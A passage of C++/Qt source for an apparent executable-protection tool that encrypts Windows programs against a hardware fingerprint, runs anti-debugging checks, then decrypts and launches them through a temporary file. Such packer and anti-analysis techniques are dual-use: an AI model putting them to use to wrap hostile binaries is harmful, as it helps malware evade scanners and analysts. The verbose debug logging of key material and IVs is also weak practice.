            qDebug() << "Failed to create temporary file";
            return -1;
        }
        
        tempFilePath = tempFile.fileName();
        
        qint64 written = tempFile.write(executableData);
        tempFile.flush();
        tempFile.close();
        
        if (written != static_cast<qint64>(executableData.size())) {
            qDebug() << "Failed to write executable data";
            return -1;
        }
    }
    
    QThread::msleep(50);
    
    QProcess process;
    process.start(tempFilePath, arguments);
    
    if (!process.waitForStarted(5000)) {
        qDebug() << "Failed to start process:" << process.errorString();
        QFile::remove(tempFilePath);
        return -1;
    }
    
    process.waitForFinished(-1);
    
    int exitCode = process.exitCode();
    QFile::remove(tempFilePath);
    
    return exitCode;
}
#else
int RuntimeProtector::executeFromMemory(const QByteArray &executableData,
                                       const QStringList &arguments)
{
    QString tempFilePath;
    
    {
        QTemporaryFile tempFile(QDir::tempPath() + QDir::separator() + "rt_prot_XXXXXX");
        tempFile.setAutoRemove(false);
        
        if (!tempFile.open()) {
            qDebug() << "Failed to create temporary file";
            return -1;
        }
        
        tempFilePath = tempFile.fileName();
        
        qint64 written = tempFile.write(executableData);
        tempFile.flush();
        tempFile.close();
        
        if (written != static_cast<qint64>(executableData.size())) {
            qDebug() << "Failed to write executable data";
            QFile::remove(tempFilePath);
            return -1;
        }
    }
    
    QFile::setPermissions(tempFilePath, QFile::ReadUser | QFile::WriteUser | QFile::ExeUser);
    
    QThread::msleep(100);
    
    QProcess process;
    process.start(tempFilePath, arguments);
    
    if (!process.waitForStarted(5000)) {
        qDebug() << "Failed to start process";
        QFile::remove(tempFilePath);
        return -1;
    }
    
    process.waitForFinished(-1);
    
    int exitCode = process.exitCode();
    
    QFile::remove(tempFilePath);
    
    return exitCode;
}
#endif

bool RuntimeProtector::encryptWithRuntimeProtection(const QString &inputFilePath,
                                                    const QString &outputFilePath,
                                                    const QString &hardwareKey)
{
    qDebug() << "=== RUNTIME PROTECTION ENCRYPTION START ===";
    qDebug() << "Input file:" << inputFilePath;
    qDebug() << "Output file:" << outputFilePath;
    qDebug() << "Hardware key:" << hardwareKey.left(16) << "...";
    
    QFile inputFile(inputFilePath);
    if (!inputFile.open(QIODevice::ReadOnly)) {
        qDebug() << "Failed to open input file";
        return false;
    }
    
    QByteArray fileData = inputFile.readAll();
    inputFile.close();
    
    if (fileData.isEmpty()) {
        qDebug() << "Input file is empty";
        return false;
    }
    
    qDebug() << "Input file size:" << fileData.size() << "bytes";
    
    // Verify it's a PE executable (Windows)
#ifdef Q_OS_WIN
    if (fileData.size() >= 2) {
        if (fileData[0] != 'M' || fileData[1] != 'Z') {
            qDebug() << "Warning: Input file does not appear to be a PE executable";
        }
    }
#endif
    
    // Inject hardware verification stub (placeholder for now)
    QByteArray modifiedData = injectHardwareVerificationStub(fileData, hardwareKey);
    
    // Derive encryption key from hardware key
    QByteArray key = deriveKey(hardwareKey);
    qDebug() << "Derived key size:" << key.size() << "bytes";
    
    // Generate IV
    QByteArray iv = generateIV();
    qDebug() << "Generated IV:" << iv.toHex();
    
    // Encrypt the data
    QByteArray encryptedData = encryptData(modifiedData, key, iv);
    
    if (encryptedData.isEmpty()) {
        qDebug() << "Encryption failed";
        return false;
    }
    
    qDebug() << "Encrypted data size:" << encryptedData.size() << "bytes";
    
    // Embed hardware fingerprint in header
    QByteArray protectedData = embedFingerprintHeader(encryptedData, hardwareKey);
    
    qDebug() << "Protected data size (with header):" << protectedData.size() << "bytes";
    
    // Save protected file
    QFile outputFile(outputFilePath);
    if (!outputFile.open(QIODevice::WriteOnly)) {
        qDebug() << "Failed to create output file";
        return false;
    }
    
    qint64 written = outputFile.write(protectedData);
    outputFile.flush();
    outputFile.close();
    
    if (written != static_cast<qint64>(protectedData.size())) {
        qDebug() << "Failed to write all protected data to file";
        return false;
    }
    
    qDebug() << "Successfully created protected executable:" << outputFilePath;
    qDebug() << "=== RUNTIME PROTECTION ENCRYPTION END ===";
    return true;
}

int RuntimeProtector::decryptAndExecuteProtected(const QString &protectedFilePath,
                                                const QStringList &arguments)
{
    qDebug() << "=== RUNTIME PROTECTED EXECUTION START ===";
    qDebug() << "Protected file:" << protectedFilePath;
    
    // Perform anti-debugging checks first
    if (!performAntiDebuggingChecks()) {
        qDebug() << "Anti-debugging checks failed - aborting execution";
        return -1;
    }
    
    // Read protected file
    QFile protectedFile(protectedFilePath);
    if (!protectedFile.open(QIODevice::ReadOnly)) {
        qDebug() << "Failed to open protected file";
        return -1;
    }
    
    QByteArray protectedData = protectedFile.readAll();
    protectedFile.close();
    
    if (protectedData.size() < MAGIC_HEADER_SIZE + FINGERPRINT_LENGTH_SIZE) {
        qDebug() << "Protected file too small";
        return -1;
    }
    
    // Extract embedded fingerprint and encrypted data
    QByteArray encryptedData;
    QString embeddedFingerprint = extractFingerprintHeader(protectedData, encryptedData);
    
    if (embeddedFingerprint.isEmpty()) {
        qDebug() << "Failed to extract fingerprint from protected file";
        return -1;
    }
    
    qDebug() << "Extracted embedded fingerprint:" << embeddedFingerprint.left(16) << "...";
    qDebug() << "Encrypted data size:" << encryptedData.size() << "bytes";
    
    // Verify hardware fingerprint matches
    if (!verifyHardwareFingerprint(embeddedFingerprint)) {
        qDebug() << "Hardware fingerprint verification FAILED - executable will not run";
        qDebug() << "This executable is bound to a different machine";
        return -1;
    }
    
    qDebug() << "Hardware fingerprint verification PASSED";
    
    // Generate current hardware key for decryption
    QString currentHardwareKey = HardwareFingerprint::generateHardwareKey();
    if (currentHardwareKey.isEmpty()) {
        qDebug() << "Failed to generate hardware key for decryption";
        return -1;
    }
    
    // Derive decryption key
    QByteArray key = deriveKey(currentHardwareKey);
    qDebug() << "Derived decryption key size:" << key.size() << "bytes";
    
    // Decrypt in memory
    qDebug() << "Decrypting in memory...";
    QByteArray decryptedData = decryptData(encryptedData, key);
    
    if (decryptedData.isEmpty()) {
        qDebug() << "Decryption failed";
        return -1;
    }
    
    qDebug() << "Decrypted data size:" << decryptedData.size() << "bytes";
    
    // Verify it's a valid PE executable
#ifdef Q_OS_WIN
    if (decryptedData.size() >= 2) {
        if (decryptedData[0] != 'M' || decryptedData[1] != 'Z') {
            qDebug() << "Decrypted data is not a valid PE executable";
            return -1;
        }
    }
#endif
    
    // Execute from memory
    qDebug() << "Executing protected executable from memory...";
    int exitCode = executeFromMemory(decryptedData, arguments);
    
    qDebug() << "Protected process exit code:" << exitCode;
    qDebug() << "=== RUNTIME PROTECTED EXECUTION END ===";
    
    return exitCode;
}
